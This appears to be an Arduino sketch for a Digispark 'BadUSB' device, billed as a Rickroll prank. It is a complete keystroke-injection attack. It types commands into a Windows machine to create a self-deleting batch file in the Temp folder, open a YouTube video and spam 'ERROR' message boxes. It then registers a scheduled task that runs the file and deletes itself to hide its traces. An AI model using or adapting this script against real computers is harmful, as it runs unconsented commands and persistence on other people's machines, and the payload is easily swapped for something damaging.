//RickRoll Task by ShiroNexo
//the file and task will auto delete when the schedule execute

#include "DigiKeyboard.h"
void setup() {}
  



void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(750);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cd C:\\Windows\\Temp");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("copy con roll.bat");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("start https://www.youtube.com/watch?v=oHg5SJYRHA0");
  DigiKeyboard.delay(300);
  DigiKeyboard.println(F("\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR\nmsg * ERROR"));
  DigiKeyboard.delay(500);
  DigiKeyboard.print("(goto) 2>null & del \"%~f0\"");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // /SC — defines the schedule for the task. Options available, include MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.
  // defines the time to run the task (in 24 hours format).
  DigiKeyboard.print("schtasks /create /tn \"RickRoll\" /SC MINUTE /st 13:00 /TR \"C:\\Windows\\Temp\\roll.bat /c notepad.exe & schtasks /delete /TN \"RickRoll\" /f\"");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

 for(;;)
  {
  }
}
